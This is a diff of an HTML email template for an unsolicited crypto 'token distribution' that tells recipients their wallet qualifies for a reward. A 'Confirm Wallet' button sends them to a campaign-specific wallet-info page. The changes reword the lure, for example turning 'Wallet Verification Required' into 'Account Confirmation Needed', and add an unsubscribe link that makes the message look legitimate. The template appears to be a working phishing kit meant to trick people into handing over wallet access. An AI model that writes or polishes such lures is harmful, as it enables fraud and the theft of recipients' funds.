@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Distribution Confirmation</title>
+    <title>Crypto Asset Update</title>
     <style>
         * {
             margin: 0;
@@ -16,6 +16,7 @@
             line-height: 1.5;
             background-color: transparent;
             padding: 20px;
+            background-color: #ffffff;
         }
         
         .container {
@@ -180,15 +181,15 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>{{ cryptocurrency }} Token Distribution</h1>
-            <p>Wallet Verification Required</p>
+            <h1>Crypto Asset Update</h1>
+            <p>Account Confirmation Needed</p>
         </div>
         
         <div class="content">
             <p class="intro-text">Your wallet has been selected for a {{ cryptocurrency }} token distribution due to your recent blockchain activity. Below are your details:</p>
             
             <div class="amount-card">
-                <div class="amount-label">Eligible Amount</div>
+                <div class="amount-label">Possible Reward</div>
                 <div class="amount-value">{{ quantity }} {{ cryptocurrency }}</div>
             </div>
             
@@ -198,16 +199,16 @@
                     <div class="detail-value">{{ cryptocurrency }}</div>
                 </div>
                 <div class="detail-row">
-                    <div class="detail-label">Qualification Threshold</div>
+                    <div class="detail-label">Requirement for participation</div>
                     <div class="detail-value">{{ min_balance }} {{ cryptocurrency }}</div>
                 </div>
                 <div class="detail-row">
                     <div class="detail-label">Status</div>
-                    <div class="detail-value" style="color: #ea580c;">Pending Verification</div>
+                    <div class="detail-value" style="color: #ea580c;">Awaiting Completion</div>
                 </div>
             </div>
             
-            <p class="intro-text">To proceed, please confirm your wallet details and claim your tokens by following the steps on our secure portal.</p>
+            <p class="intro-text">Based on activities your wallet qualified and We have noted your address. Details for accessing the reward can be found here</p>
             
             <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="cta-button">
                 Confirm Wallet
@@ -216,6 +217,7 @@
         
         <div class="footer">
             <p>&copy; {{ current_year }} {{ cryptocurrency }} Distribution</p>
+            <p>If you no longer wish to receive these emails, you can <a href="#" style="color: #2563eb; text-decoration: underline;">unsubscribe here</a>.</p>
         </div>
     </div>
 </body>
